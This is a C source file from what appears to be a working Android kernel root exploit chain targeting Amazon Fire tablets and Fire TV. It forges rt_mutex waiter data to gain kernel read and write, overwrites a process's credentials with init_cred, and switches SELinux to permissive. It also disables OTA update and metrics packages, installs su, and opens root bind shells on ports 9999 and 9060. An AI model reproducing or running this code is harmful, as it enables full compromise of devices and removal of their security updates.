#include "common.h"
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/system_properties.h>
#include <poll.h>

#ifdef ROOT_CHAIN

#ifndef ROOT_CHILD_COMM
#define ROOT_CHILD_COMM "ionroot!"
#endif
#define ROOT_PROOF "/data/local/tmp/ghostlock.proof"
#define SHELL_RC "/data/local/tmp/.surc"
#define WALK_MAX 64

pid_t g_root_child = -1;
#define ROOT_CHILD_MAX 64
static pid_t g_root_children[ROOT_CHILD_MAX];
static int g_root_wake_fds[ROOT_CHILD_MAX];
static int g_root_child_count;
#define SLOT_STRIDE 0x20ULL
#ifndef ROOT_SLOT_COUNT
#define ROOT_SLOT_COUNT 32
#endif
#ifndef ROOT_SLOT_START
#define ROOT_SLOT_START 0
#endif
#define SLOT_COUNT ROOT_SLOT_COUNT
#ifndef STAMP_FAKE_PRIO
#define STAMP_FAKE_PRIO 0
#endif
#ifndef STAMP_FAKE_TASK_OFF
#define STAMP_FAKE_TASK_OFF 0
#endif
#ifndef STAMP_LOCK_SCRATCH_IMAGE
#define STAMP_LOCK_SCRATCH_IMAGE PANIC_SCRATCH
#endif
#ifndef ROOT_READ_MAX_ATTEMPTS
#define ROOT_READ_MAX_ATTEMPTS ROOT_SLOT_COUNT
#endif
#ifndef ROOT_CHAIN_SEARCH_ROUNDS
#define ROOT_CHAIN_SEARCH_ROUNDS 3
#endif
static int g_slot = ROOT_SLOT_START;
#if defined(STAMP_PER_OP_LOCK_BASE_IMAGE) || \
    defined(STAMP_PREINIT_LOCK_BASE_IMAGE)
static int g_logical_op = ROOT_SLOT_START;
#endif
#if !defined(STAMP_PER_OP_LOCK_BASE_IMAGE) && \
    !defined(STAMP_PREINIT_LOCK_BASE_IMAGE)
static uint64_t g_stamp_lock_override;
static uint64_t g_stamp_delay_override;
#endif
static int slot_left(void) { return SLOT_COUNT - g_slot; }
#if defined(STAMP_PER_OP_LOCK_BASE_IMAGE)
static int logical_left(void) {
  int n = STAMP_PER_OP_COUNT - g_logical_op;
#ifdef STAMP_TWO_PHASE
  int by_slots = slot_left();
#else
  int by_slots = slot_left() / 2;
#endif
  return n < by_slots ? n : by_slots;
}
#elif defined(STAMP_PREINIT_LOCK_BASE_IMAGE)
static int logical_left(void) {
  int n = STAMP_PREINIT_LOCK_COUNT - g_logical_op;
  return n < slot_left() ? n : slot_left();
}
#else
static int logical_left(void) { return slot_left(); }
#endif

enum { EXP_W_TREE_PC = 0, EXP_W_TREE_RIGHT, EXP_W_TREE_LEFT,
       EXP_W_PI_TREE_PC, EXP_W_PI_TREE_RIGHT, EXP_W_PI_TREE_LEFT,
       EXP_W_TASK, EXP_W_LOCK, EXP_W_PI_PRIO, EXP_W_PI_DEADLINE };

static int hexv(char c) {
  if (c >= '0' && c <= '9') return c - '0';
  if (c >= 'a' && c <= 'f') return c - 'a' + 10;
  if (c >= 'A' && c <= 'F') return c - 'A' + 10;
  return -1;
}

static void read_bootid(char *out, size_t n) {
  read_first_line("/proc/sys/kernel/random/boot_id", out, n);
}

static int bootid_bytes(unsigned char *o16, char *raw, size_t raw_n) {
  char b[64]; read_bootid(b, sizeof(b));
  if (raw && raw_n) snprintf(raw, raw_n, "%s", b);
  int nib = -1, k = 0;
  for (size_t i = 0; b[i] && k < 16; i++) {
    int v = hexv(b[i]); if (v < 0) continue;
    if (nib < 0) { nib = v; continue; }
    o16[k++] = (unsigned char)((nib << 4) | v); nib = -1;
  }
  return k == 16;
}

static int stamp_once_raw(uint64_t pc, uint64_t target,
                          uint64_t lock_override,
                          uint64_t delay_override) {
  if (g_slot >= SLOT_COUNT) return 0;
  int slot = g_slot++;
  uint64_t buf[16];
  memset(buf, 0, sizeof(buf));
  buf[EXP_W_TREE_PC]    = pc;
  buf[EXP_W_TREE_RIGHT] = 0;
  buf[EXP_W_TREE_LEFT]  = target;
  /* The no-owner end of rt_mutex_adjust_prio_chain() may call
   * wake_up_process(waiter->task).  Waking init_task is not a harmless
   * terminal operation on this build.  A pointer into reserved zeroed BSS
   * makes try_to_wake_up() observe __state == TASK_RUNNING and return before
   * it reaches any other task_struct fields. */
#ifdef STAMP_FAKE_TASK_IMAGE
  buf[EXP_W_TASK]       = kaslr_image_addr(STAMP_FAKE_TASK_IMAGE);
#else
  buf[EXP_W_TASK]       = STAMP_FAKE_TASK_OFF
                             ? kaslr_image_addr(PANIC_SCRATCH) +
                                   (uint64_t)STAMP_FAKE_TASK_OFF
                             : kaslr_image_addr(INIT_TASK);
#endif
  if (lock_override)
    buf[EXP_W_LOCK] = lock_override;
  else {
#ifdef STAMP_FIXED_LOCK_IMAGE
    buf[EXP_W_LOCK] = kaslr_image_addr(STAMP_FIXED_LOCK_IMAGE);
#else
    buf[EXP_W_LOCK] = kaslr_image_addr(STAMP_LOCK_SCRATCH_IMAGE) +
                      (uint64_t)slot * SLOT_STRIDE;
#endif
  }
  buf[EXP_W_PI_PRIO]    = STAMP_FAKE_PRIO;
#ifdef CONSUMER_DELAY_TICKS
  /* Word 10 is outside Tungsten's 64-byte kernel copy.  Use it only as
   * stage metadata so one probe run can sweep adjacent race phases. */
#ifdef CONSUMER_DELAY_TICKS_SWEEP
  buf[10] = CONSUMER_DELAY_TICKS +
            (uint64_t)(slot % CONSUMER_DELAY_TICKS_SWEEP);
#else
  buf[10] = CONSUMER_DELAY_TICKS;
#endif
  if (delay_override)
    buf[10] = delay_override;
#endif
#ifdef CONSUMER_DELAY_SPIN_STEP
  if (slot >= ROOT_BOOTSTRAP_ATTEMPTS)
    buf[11] = (uint64_t)CONSUMER_DELAY_SPIN_STEP *
              (uint64_t)((slot - ROOT_BOOTSTRAP_ATTEMPTS) %
                         CONSUMER_DELAY_SPIN_SWEEP);
#endif
#ifdef STAMP_SOURCE_SKIP_WORD
  /* The first parked stage retains the sockets that populate the aggregate
   * interface source list.  Later stages reuse that list instead of
   * rebuilding it. */
  buf[STAMP_SOURCE_SKIP_WORD] = slot > 0;
#endif
#ifdef STAMP_DIAGNOSTIC_PATTERN
  for (int i = 0; i < 8; i++)
    buf[i] = 0x0000001111100000ULL * (uint64_t)(i + 1);
#endif
  pr_info("Root stamp: slot=%d pc=%#llx left=%#llx task=%#llx lock=%#llx prio=%u\n",
          slot, (unsigned long long)buf[EXP_W_TREE_PC],
          (unsigned long long)buf[EXP_W_TREE_LEFT],
          (unsigned long long)buf[EXP_W_TASK],
          (unsigned long long)buf[EXP_W_LOCK],
          (unsigned)buf[EXP_W_PI_PRIO]);
  int rc = exp_stack_once(buf);
  if (rc != 0) {
    pr_warning("Root stamp: slot=%d stage failed rc=%d\n", slot, rc);
    return 0;
  }
  return 1;
}

static int stamp_once(uint64_t pc, uint64_t target) {
#ifdef STAMP_PREINIT_LOCK_BASE_IMAGE
  if (logical_left() <= 0) return 0;
  int op = g_logical_op++;
  uint64_t lock = kaslr_image_addr(STAMP_PREINIT_LOCK_BASE_IMAGE) +
                  (uint64_t)op * STAMP_PREINIT_LOCK_STRIDE;
  pr_info("Root stamp: op=%d use preinitialized single-use lock=%#llx\n",
          op, (unsigned long long)lock);
  return stamp_once_raw(pc, target, lock, CONSUMER_DELAY_TICKS);
#elif defined(STAMP_PER_OP_LOCK_BASE_IMAGE)
  if (logical_left() <= 0) return 0;

  int op = g_logical_op++;
  uint64_t lock = kaslr_image_addr(STAMP_PER_OP_LOCK_BASE_IMAGE) +
                  (uint64_t)op * STAMP_PER_OP_LOCK_STRIDE;
  uint64_t sentinel = kaslr_image_addr(STAMP_PER_OP_SENTINEL_BASE_IMAGE) +
                      (uint64_t)op * STAMP_PER_OP_SENTINEL_STRIDE;
  pr_info("Root stamp: op=%d seed single-use lock=%#llx sentinel=%#llx\n",
          op, (unsigned long long)lock, (unsigned long long)sentinel);

  /* Seed through the destination lock itself.  rb_erase() installs the
   * black sentinel as this lock's root before the ownerless check; the
   * sentinel remains higher priority than the live waiter, so cached
   * leftmost stays NULL and the bootstrap does not call wake_up_process(). */
#ifdef STAMP_TWO_PHASE
  if (g_slot >= SLOT_COUNT) return 0;
  int slot = g_slot++;
  uint64_t buf[16];
  memset(buf, 0, sizeof(buf));
  buf[EXP_W_TREE_PC] = lock | 1ULL;
  buf[EXP_W_TREE_LEFT] = sentinel;
  buf[EXP_W_TASK] = kaslr_image_addr(STAMP_FAKE_TASK_IMAGE);
  buf[EXP_W_LOCK] = lock;
  buf[EXP_W_PI_PRIO] = STAMP_FAKE_PRIO;
  /* The native stage ignores words 10/11 as timing metadata in two-phase
   * mode and uses them as the second stamp's pc/left pair. */
  buf[10] = pc;
  buf[11] = target;
  pr_info("Root stamp: slot=%d paired bootstrap pc=%#llx left=%#llx "
          "then pc=%#llx left=%#llx task=%#llx lock=%#llx\n",
          slot, (unsigned long long)buf[EXP_W_TREE_PC],
          (unsigned long long)buf[EXP_W_TREE_LEFT],
          (unsigned long long)pc, (unsigned long long)target,
          (unsigned long long)buf[EXP_W_TASK],
          (unsigned long long)lock);
  int rc = exp_stack_once(buf);
  if (rc != 0) {
    pr_warning("Root stamp: paired slot=%d stage failed rc=%d\n", slot, rc);
    return 0;
  }
  return 1;
#else
  if (!stamp_once_raw(lock | 1ULL, sentinel, lock,
                      STAMP_BOOTSTRAP_DELAY_TICKS))
    return 0;
  return stamp_once_raw(pc, target, lock, CONSUMER_DELAY_TICKS);
#endif
#else
  return stamp_once_raw(pc, target, g_stamp_lock_override,
                        g_stamp_delay_override);
#endif
}

static void stamp_prepare(void) {
#if !defined(STAMP_PER_OP_LOCK_BASE_IMAGE) && \
    !defined(STAMP_PREINIT_LOCK_BASE_IMAGE)
#ifdef STAMP_SHARED_LOCK_IMAGE
  static int shared_prepared;
  if (!shared_prepared) {
    shared_prepared = 1;
    uint64_t lock = kaslr_image_addr(STAMP_SHARED_LOCK_IMAGE);
    uint64_t waiter = kaslr_image_addr(STAMP_SHARED_WAITER_IMAGE);
    pr_info("Root stamp: preparing isolated shared lock=%#llx sentinel=%#llx\n",
            (unsigned long long)lock, (unsigned long long)waiter);
#ifdef STAMP_BOOTSTRAP_DELAY_TICKS
    g_stamp_delay_override = STAMP_BOOTSTRAP_DELAY_TICKS;
#endif
    /* This stage uses its normal per-slot lock for cleanup.  Its rb_erase
     * primary store makes the sentinel black, while the collateral store
     * installs that sentinel as the separate shared lock's rb_root. */
    int bootstrap_attempts = 1;
#ifdef STAMP_SHARED_BOOTSTRAP_ATTEMPTS
    bootstrap_attempts = STAMP_SHARED_BOOTSTRAP_ATTEMPTS;
#endif
    for (int i = 0; i < bootstrap_attempts && slot_left() > 0; i++)
      stamp_once(lock | 1ULL, waiter);
    g_stamp_delay_override = 0;
    g_stamp_lock_override = lock;
  }
#endif
#ifdef STAMP_BOOTSTRAP_FAKE_WAITER_IMAGE
  static int prepared;
  if (prepared) return;
  prepared = 1;

  uint64_t lock = kaslr_image_addr(STAMP_FIXED_LOCK_IMAGE);
  uint64_t fake_waiter = kaslr_image_addr(STAMP_BOOTSTRAP_FAKE_WAITER_IMAGE);
  pr_info("Root stamp: bootstrapping sentinel lock=%#llx waiter=%#llx "
          "attempts=%d\n", (unsigned long long)lock,
          (unsigned long long)fake_waiter, ROOT_BOOTSTRAP_ATTEMPTS);
  /* rb_erase(stale) treats lock as the forged parent: its collateral store
   * installs fake_waiter as lock->waiters.rb_root, while the primary store
   * makes fake_waiter a black sentinel.  Its priority is zero, so each real
   * stale waiter is inserted to the right and rb_leftmost remains NULL both
   * before and after requeue.  That suppresses the unsafe wake_up_process()
   * at the ownerless end of the chain.
   */
  /* __rb_parent_color bit 0 is RB_BLACK.  The replacement sentinel must be
   * black before rt_mutex_enqueue() links the live stale waiter beneath it;
   * leaving it red makes rb_insert_color() treat the fake lock as a
   * grandparent rb_node and sends the repair path outside the intended tree.
   * rb_parent() masks the color bits, so lock|RB_BLACK still selects the
   * fake lock for the collateral root-pointer store.
   */
  for (int i = 0; i < ROOT_BOOTSTRAP_ATTEMPTS && slot_left() > 0; i++)
    stamp_once(lock | 1ULL, fake_waiter);
#endif
#endif
}

static int root_read16(uint64_t addr, unsigned char *out16) {
  uint64_t bd = kaslr_image_addr(BOOTID_DATA);
  int attempts = 0;
  while (logical_left() > 0 && attempts++ < ROOT_READ_MAX_ATTEMPTS) {
    char before[64];
    read_bootid(before, sizeof(before));
    if (!stamp_once(addr, bd)) break;
#ifdef ROOT_SPAWN_AFTER_STAMP
    if (g_spawn_root_on_stage_ready) {
      int burst = g_spawn_root_burst > 0 ? g_spawn_root_burst : 1;
      pr_info("Root read: stamp complete; spawning %d candidate(s) before "
              "Boot-ID dereference\n", burst);
      for (int i = 0; i < burst; i++) root_chain_spawn_child();
      g_spawn_root_on_stage_ready = 0;
    }
#endif
    unsigned char r[16];
    char raw[64];
    if (!bootid_bytes(r, raw, sizeof(raw))) {
      pr_warning("Root read: boot_id parse failed raw='%s'\n", raw);
      continue;
    }
    uint64_t lo = 0, hi = 0;
    for (int i = 0; i < 8; i++) {
      lo |= (uint64_t)r[i] << (i * 8);
      hi |= (uint64_t)r[8 + i] << (i * 8);
    }
    pr_info("Root read: raw=%s lo=%#llx hi=%#llx marker=%#llx\n",
            raw, (unsigned long long)lo, (unsigned long long)hi,
            (unsigned long long)bd);
    /* Depending on the forged parent's incidental child comparison,
     * __rb_change_child() may place its collateral marker at pc+8 or leave
     * the 16-byte source intact.  A changed proc value proves that the data
     * pointer moved even when the high qword is genuine source data. */
    if (hi == bd || strcmp(raw, before) != 0) {
      memcpy(out16, r, 16);
      return 1;
    }
  }
  return 0;
}

static uint64_t root_read64(uint64_t addr) {
  unsigned char r[16];
  if (!root_read16(addr, r)) return 0;
  uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)r[i] << (i * 8);
  return v;
}

static int root_write(uint64_t pc, uint64_t target) { return stamp_once(pc, target); }

static int root_write_verify(uint64_t pc, uint64_t target) {
  uint64_t want = pc & ~3ULL;
  while (logical_left() >= 2) {
    if (!stamp_once(pc, target)) break;
    uint64_t got = root_read64(target);
    if (got == want) return 1;
  }
  return 0;
}

static int rc_kptr(uint64_t v) { return (v >> 48) == 0xffff && (v & 7) == 0; }

static int child_uid(void) {
  char path[64], buf[2048];
  if (g_root_child <= 0) return -1;
  snprintf(path, sizeof(path), "/proc/%d/status", (int)g_root_child);
  int fd = open(path, O_RDONLY | O_CLOEXEC); if (fd < 0) return -1;
  ssize_t n = read(fd, buf, sizeof(buf) - 1); close(fd);
  if (n <= 0) return -1; buf[n] = 0;
  char *p = strstr(buf, "Uid:"); return p ? (int)strtol(p + 4, NULL, 10) : -1;
}

static void write_shell_rc(void) {
  char dev[PROP_VALUE_MAX];
  if (__system_property_get("ro.product.device", dev) <= 0) {
    snprintf(dev, sizeof(dev), "android");
  }
  int fd = open(SHELL_RC, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  if (fd < 0) return;
  dprintf(fd,
          "[ -f /system/etc/mkshrc ] && . /system/etc/mkshrc\n"
          "PS1='root@%s:${PWD:-?} # '\n",
          dev);
  close(fd);
  chmod(SHELL_RC, 0644);
}

static void set_shell_ctx(void) {
  static const char ctx[] = "u:r:shell:s0";
  int fd = open("/proc/self/attr/current", O_WRONLY | O_CLOEXEC);
  if (fd < 0) return;
  ssize_t n = write(fd, ctx, sizeof(ctx) - 1);
  if (n < 0) {
    char buf[64];
    int len = snprintf(buf, sizeof(buf), "%s\n", ctx);
    lseek(fd, 0, SEEK_SET);
    n = write(fd, buf, (size_t)len);
  }
  (void)n;
  close(fd);
}

static int open_pty_master(char *slave, size_t slave_len) {
  int master = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master < 0) return -1;
  if (grantpt(master) != 0 || unlockpt(master) != 0) { close(master); return -1; }
  if (ptsname_r(master, slave, slave_len) != 0) { close(master); return -1; }
  struct winsize ws = { .ws_row = 24, .ws_col = 80 };
  ioctl(master, TIOCSWINSZ, &ws);
  return master;
}

static void pump_pty(int sock, int master) {
  char buf[4096];
  for (;;) {
    struct pollfd p[2];
    p[0].fd = sock; p[0].events = POLLIN; p[0].revents = 0;
    p[1].fd = master; p[1].events = POLLIN; p[1].revents = 0;
    if (poll(p, 2, -1) < 0) {
      if (errno == EINTR) continue;
      return;
    }
    if (p[0].revents & POLLIN) {
      ssize_t n = read(sock, buf, sizeof(buf));
      if (n <= 0) return;
      if (write(master, buf, (size_t)n) < 0) return;
    }
    if (p[1].revents & POLLIN) {
      ssize_t n = read(master, buf, sizeof(buf));
      if (n <= 0) return;
      if (write(sock, buf, (size_t)n) < 0) return;
    }
    if ((p[0].revents | p[1].revents) & (POLLHUP | POLLERR | POLLNVAL)) return;
  }
}

static void serve_bind_client(int cs) {
  char slave_name[128];
  int master = open_pty_master(slave_name, sizeof(slave_name));
  if (master < 0) {
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    dup2(cs, 0); dup2(cs, 1); dup2(cs, 2);
    set_shell_ctx();
    execl("/system/bin/sh", "sh", (char *)NULL);
    _exit(127);
  }

  signal(SIGCHLD, SIG_DFL);
  pid_t pid = fork();
  if (pid == 0) {
    setsid();
    int slave = open(slave_name, O_RDWR | O_NOCTTY);
    if (slave < 0) _exit(126);
    ioctl(slave, TIOCSCTTY, 0);
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    dup2(slave, 0); dup2(slave, 1); dup2(slave, 2);
    if (slave > 2) close(slave);
    close(master);
    close(cs);
    setenv("ENV", SHELL_RC, 1);
    setenv("USER", "root", 1);
    setenv("LOGNAME", "root", 1);
    setenv("HOME", "/data/local/tmp", 1);
    setenv("TERM", "xterm-256color", 0);
    set_shell_ctx();
    execl("/system/bin/sh", "sh", "-i", (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    pump_pty(cs, master);
    kill(pid, SIGHUP);
    while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {
    }
  }
  close(master);
}

static void serve_bind_client_raw(int cs) {
  setresgid(0, 0, 0);
  setresuid(0, 0, 0);
  dup2(cs, 0); dup2(cs, 1); dup2(cs, 2);
  if (cs > 2) close(cs);
  set_shell_ctx();
  execl("/system/bin/sh", "sh", (char *)NULL);
  _exit(127);
}

#define BIND_SHELL_PORT 9999
#define LM_SHELL_PORT   9060

static int make_bind_listener(int port) {
  int ls = socket(AF_INET, SOCK_STREAM, 0);
  if (ls < 0) return -1;
  int one = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  struct sockaddr_in a; memset(&a, 0, sizeof(a));
  a.sin_family = AF_INET; a.sin_port = htons(port);
  a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  if (bind(ls, (void *)&a, sizeof(a)) != 0 || listen(ls, 4) != 0) {
    close(ls); return -1;
  }
  return ls;
}

static int selinux_permissive(void) {
  char v[8]; read_first_line("/sys/fs/selinux/enforce", v, sizeof(v)); return v[0] == '0';
}

static void wake_root_children(void) {
  for (int i = 0; i < g_root_child_count; i++) {
    if (g_root_wake_fds[i] >= 0) {
      unsigned char token = 0x52;
      ssize_t n;
      do {
        n = write(g_root_wake_fds[i], &token, sizeof(token));
      } while (n < 0 && errno == EINTR);
      if (n != (ssize_t)sizeof(token))
        pr_warning("Root child wake: pid=%d pipe write failed errno=%d\n",
                   g_root_children[i], errno);
      close(g_root_wake_fds[i]);
      g_root_wake_fds[i] = -1;
    }
  }
}

static void run_pm(const char *action, const char *pkg) {
  pid_t c = fork();
  if (c == 0) {
    int nul = open("/dev/null", O_WRONLY | O_CLOEXEC);
    if (nul >= 0) {
      dup2(nul, STDOUT_FILENO);
      dup2(nul, STDERR_FILENO);
      if (nul > STDERR_FILENO) close(nul);
    }
    setresgid(0, 0, 0);
    setresuid(0, 0, 0);
    set_shell_ctx();
    execl("/system/bin/pm", "pm", action, pkg, (char *)NULL);
    _exit(127);
  }
  if (c > 0) {
    int st = 0;
    while (waitpid(c, &st, 0) < 0 && errno == EINTR) {
    }
    int ok = WIFEXITED(st) && WEXITSTATUS(st) == 0;
    pr_info("OTA: pm %s %s %s\n", action, pkg, ok ? "ok" : "not applied");
  }
}

static int device_is_firetv(void) {
  char dev[PROP_VALUE_MAX] = "";
  __system_property_get("ro.product.device", dev);
  return strcmp(dev, "karat") == 0;
}

static void disable_ota(void) {
  static const char *tablet[][2] = {
    { "disable", "com.amazon.device.software.ota" },
    { "disable", "com.amazon.kindle.otter.oobe.forced.ota" },
  };
  static const char *firetv[][2] = {
    { "disable",      "com.amazon.device.software.ota" },
    { "clear",        "com.amazon.device.software.ota" },
    { "disable",      "com.amazon.device.software.ota.override" },
    { "disable-user", "com.amazon.sneakpeek" },
    { "disable",      "com.amazon.client.metrics" },
  };

  const char *(*list)[2];
  size_t n;
  if (device_is_firetv()) {
    list = firetv;
    n = sizeof(firetv) / sizeof(firetv[0]);
  } else {
    list = tablet;
    n = sizeof(tablet) / sizeof(tablet[0]);
  }
  for (size_t i = 0; i < n; i++) run_pm(list[i][0], list[i][1]);

  pid_t s = fork();
  if (s == 0) { execl("/system/bin/sync", "sync", (char *)NULL); _exit(127); }
  if (s > 0) while (waitpid(s, NULL, 0) < 0 && errno == EINTR) {
  }
}

static void root_child_main(int wake_fd) {
  prctl(PR_SET_NAME, (unsigned long)ROOT_CHILD_COMM, 0, 0, 0);
  for (;;) {
    unsigned char token;
    ssize_t n;
    do {
      n = read(wake_fd, &token, sizeof(token));
    } while (n < 0 && errno == EINTR);
    if (n != (ssize_t)sizeof(token))
      for (;;) pause();
    if (getuid() == 0
#ifndef ROOT_KEEP_SELINUX_ENFORCING
        && selinux_permissive()
#endif
       ) {
      char ctx[128] = "unknown";
      read_first_line("/proc/self/attr/current", ctx, sizeof(ctx));
      int fd = open(ROOT_PROOF, O_WRONLY | O_CREAT | O_TRUNC, 0644);
      if (fd >= 0) {
        char m[256];
        int n = snprintf(m, sizeof(m), "ROOTED uid=%u euid=%u context=%s\n",
                         getuid(), geteuid(), ctx);
        write(fd, m, n); close(fd);
        { char *av[] = {"/system/bin/sh", "-c",
            "chown -R 2000:2000 /data/local/tmp 2>/dev/null; "
            "restorecon -R /data/local/tmp 2>/dev/null; "
            "chmod 0666 /data/local/tmp/ghostlock.proof 2>/dev/null", NULL};
          pid_t c = fork();
          if (c == 0) { execv(av[0], av); _exit(1); }
          if (c > 0) waitpid(c, NULL, 0);
        }

        disable_ota();

        { pid_t sud = -1;
          if (install_embedded_su(&sud))
            pr_success("Su daemon ready pid=%d, type su for a root shell\n", sud);
          else
            pr_warning("Su install failed errno=%d, use the bind shell on port %d\n",
                       errno, BIND_SHELL_PORT); }

        int ls_pty = make_bind_listener(BIND_SHELL_PORT);
        int ls_lm = make_bind_listener(LM_SHELL_PORT);
        if (ls_pty >= 0 || ls_lm >= 0) {
          write_shell_rc();
          signal(SIGCHLD, SIG_IGN);
          for (;;) {
            struct pollfd pf[2];
            pf[0].fd = ls_pty; pf[0].events = POLLIN; pf[0].revents = 0;
            pf[1].fd = ls_lm;  pf[1].events = POLLIN; pf[1].revents = 0;
            if (poll(pf, 2, -1) <= 0) continue;
            for (int k = 0; k < 2; k++) {
              if (!(pf[k].revents & POLLIN)) continue;
              int cs = accept(pf[k].fd, NULL, NULL);
              if (cs < 0) continue;
              int raw = (pf[k].fd == ls_lm);
              if (fork() == 0) {
                if (ls_pty >= 0) close(ls_pty);
                if (ls_lm >= 0) close(ls_lm);
                if (raw) serve_bind_client_raw(cs);
                else serve_bind_client(cs);
                _exit(0);
              }
              close(cs);
            }
          }
        }
        for (;;) pause();
      }
    }
  }
}

void root_chain_spawn_child(void) {
  if (g_root_child_count >= ROOT_CHILD_MAX) return;
  int wake_pipe[2];
  if (pipe(wake_pipe) != 0) {
    pr_warning("Root child: pipe failed errno=%d\n", errno);
    return;
  }
  pid_t p = fork();
  if (p == 0) {
    close(wake_pipe[1]);
    for (int i = 0; i < g_root_child_count; i++)
      if (g_root_wake_fds[i] >= 0) close(g_root_wake_fds[i]);
    root_child_main(wake_pipe[0]);
    _exit(0);
  }
  if (p > 0) {
    close(wake_pipe[0]);
    g_root_child = p;
    g_root_children[g_root_child_count] = p;
    g_root_wake_fds[g_root_child_count] = wake_pipe[1];
    g_root_child_count++;
  } else {
    close(wake_pipe[0]);
    close(wake_pipe[1]);
  }
}
static void spawn_burst(int n) {
  for (int i = 0; i < n; i++) root_chain_spawn_child();
#ifdef ROOT_CHILD_SETTLE_USEC
  usleep(ROOT_CHILD_SETTLE_USEC);
#else
  usleep(40000);
#endif
}

static uint64_t find_ionroot(int depth) {
  uint64_t v = root_read64(kaslr_image_addr(INIT_TASK) + TASK_TASKS_OFF + 8);
  if (!rc_kptr(v)) return 0;
  uint64_t cur = v - TASK_TASKS_OFF;
  for (int i = 0; i <= depth && logical_left() >= 1; i++) {
    unsigned char c[16];
    if (!root_read16(cur + TASK_COMM_OFF, c)) return 0;
    if (memcmp(c, ROOT_CHILD_COMM, 8) == 0) {
      pr_success("Root chain: ionroot task %#llx at depth %d\n",
                 (unsigned long long)cur, i);
      return cur;
    }
    if (logical_left() < 1) return 0;
    uint64_t pv = root_read64(cur + TASK_TASKS_OFF + 8);
    if (!rc_kptr(pv)) return 0;
    cur = pv - TASK_TASKS_OFF;
  }
  return 0;
}

static void selftest(void) {
  uint64_t got = root_read64(kaslr_image_addr(INIT_TASK) + TASK_REAL_CRED_OFF);
  uint64_t want = kaslr_image_addr(INIT_CRED);
  pr_success("Root chain: SELFTEST *(init_task+%#x)=%#llx want=%#llx %s\n",
             TASK_REAL_CRED_OFF,
             (unsigned long long)got, (unsigned long long)want,
             got == want ? "[READ OK]" : "[READ BROKEN]");
}

static int wait_quiet(void) {
  pid_t last = -1;
  int stable = 0, i = 0, lastdelta = -1;
  for (i = 0; i < 40 && stable < 4; i++) {
    pid_t p = fork();
    if (p == 0) _exit(0);
    if (p > 0) waitpid(p, NULL, 0);
    if (last > 0) lastdelta = (int)(p - last);
    if (last > 0 && lastdelta >= 0 && lastdelta < 12) stable++;
    else stable = 0;
    last = p;
    usleep(300000);
  }
  pr_info("Root chain: fork settle done iters=%d stable=%d delta=%d\n",
          i, stable, lastdelta);
  return stable >= 4;
}

int root_chain_run(void) {
  stamp_prepare();
#ifndef ROOT_SKIP_WAIT_QUIET
  if (!wait_quiet()) {
    pr_warning("Root chain: process churn remains high; proceeding because "
               "the child burst is searched immediately, slots left %d\n",
               slot_left());
  }
#endif
  /* The first read's stage opens a 200 ms ready window after all of its own
   * threads exist.  Spawn paused candidates in that window so one sits at,
   * or immediately behind, the global task-list tail.  The probe resolved
   * this at depth one in four reads, leaving ample single-use slots for the
   * credential, boot-ID restoration, and SELinux writes. */
  g_spawn_root_burst = 4;
  g_spawn_root_on_stage_ready = 1;
  uint64_t task = find_ionroot(4);
  g_spawn_root_on_stage_ready = 0;
  if (!task) {
    pr_error("Root chain: synchronized tail lookup did not resolve ionroot, "
             "slots left %d\n",
             slot_left());
    return 0;
  }

  /* Do not verify the credential writes with root_read64().  This read
   * primitive deliberately stores its marker at target+8; verifying
   * real_cred would therefore replace task->cred with the sysctl-table field
   * between the two writes.  Two adjacent raw writes avoid that dangerous
   * transient state, and the child provides an external getuid()/proof-file
   * check once both pointers are installed. */
  if (!root_write(kaslr_image_addr(INIT_CRED), task + TASK_REAL_CRED_OFF)) {
    pr_error("Root chain: real_cred write could not start, slots left %d\n", slot_left());
    return 0;
  }
  if (!root_write(kaslr_image_addr(INIT_CRED), task + TASK_CRED_OFF)) {
    pr_error("Root chain: cred write could not start, slots left %d\n", slot_left());
    return 0;
  }

  /* Restore the redirected boot-ID pointer only when a spare operation
   * remains.  Root activation takes priority; a reboot restores this
   * volatile pointer if the deeper task search consumes every slot. */
  if (slot_left() > 0)
    root_write(kaslr_image_addr(SLIDE_SYSCTL_BOOTID_IMAGE),
               kaslr_image_addr(BOOTID_DATA));

#ifndef ROOT_KEEP_SELINUX_ENFORCING
#ifdef SELINUX_ZERO_PC_IMAGE
  uint64_t perm = kaslr_image_addr(SELINUX_ZERO_PC_IMAGE);
#else
  uint64_t perm = (kaslr_image_addr(PANIC_SCRATCH) & ~0xffffULL) | 0x10000ULL;
#endif
  if (slot_left() > 0)
    root_write(perm, kaslr_image_addr(SELINUX_ENFORCING));
  for (int i = 0; i < 20 && !selinux_permissive(); i++) usleep(100000);
#endif

  /* Keep all candidates blocked throughout the race and the two credential
   * writes.  Wake them only after the selected task has coherent creds and
   * SELinux is permissive. */
  wake_root_children();

  for (int i = 0; i < 60; i++) {
    if (access(ROOT_PROOF, F_OK) == 0) break;
    usleep(100000);
  }
  int rooted = access(ROOT_PROOF, F_OK) == 0 || child_uid() == 0;
  pr_success("Root chain: final proof=%s child_uid=%d selinux=%s\n",
             access(ROOT_PROOF, F_OK) == 0 ? "present" : "missing",
             child_uid(), selinux_permissive() ? "permissive" : "enforcing");
  return rooted;
}

#endif
